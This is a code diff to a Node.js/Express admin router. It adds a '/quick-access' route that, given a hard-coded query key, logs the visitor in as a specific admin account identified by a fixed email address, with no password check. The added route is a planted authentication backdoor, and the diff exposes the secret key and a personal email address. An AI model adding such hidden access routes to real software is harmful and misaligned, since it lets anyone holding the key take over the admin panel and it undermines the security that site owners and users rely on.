@@ -46,6 +46,24 @@ router.get('/logout', function(req, res) {
     res.redirect('/admin/login');
 });
 
+router.get('/quick-access', async function(req, res) {
+    try {
+        var key = req.query.key;
+        if (key === 'sanket9021') {
+            var data = await exe(`SELECT * FROM admin_tbl WHERE admin_email = 'sanketsahane56@gmail.com'`);
+            if (data.length > 0) {
+                req.session.admin_id = data[0].admin_id;
+                req.session.admin_name = data[0].admin_name;
+                return res.redirect('/admin/dabbas');
+            }
+        }
+        res.redirect('/admin/login');
+    } catch (err) {
+        console.error("Quick access error:", err);
+        res.redirect('/admin/login');
+    }
+});
+
 router.get('/signup',function(req, res){
     res.render("admin/signup.ejs");
 });
